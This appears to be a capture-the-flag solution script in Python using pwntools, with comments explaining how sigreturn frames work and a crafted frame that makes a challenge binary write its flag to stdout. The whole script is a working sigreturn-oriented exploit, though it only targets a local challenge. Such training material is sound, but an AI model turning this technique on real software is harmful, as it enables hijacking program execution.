import pwn

# funsignals_player_bin is a 64-bit statically linked binary
# ASLR is turned on. All other mitigations are off

# This binary basically just allows us to send it a sigreturn frame, and then makes a sigreturn syscall using our sigreturn frame
# This is less of an exploit and more just a demonstration of how to use sigreturn frames

# When the kernel delivers a signal from a program, it creates a frame on the stack before it is passed to the signal handler
# That frame is then used as context for a sigreturn syscall after the signal is handled

# Basically this is a way of saving all the registers (including rip) so that we can continue executing in the exact context we were in when we sent the signal

target = pwn.process('./funsignals_player_bin')

# Need to specify the architecture in order to use pwn.SigreturnFrame
pwn.context.arch = "amd64"

frame = pwn.SigreturnFrame()

# Specify rip to point to a syscall instruction in the binary
frame.rip = 0x1000000b

# Setup registers for a write syscall
frame.rax = 0x1 # write syscall
frame.rdi = 0x1 # write to stdout
frame.rsi = 0x10000023 # address of the flag in the binary
frame.rdx = 200 # number of bytes to write

target.send(bytes(frame))

flag = target.recv(200)
first_null = flag.find(b'\x00')
flag = flag[:first_null]

print(flag)
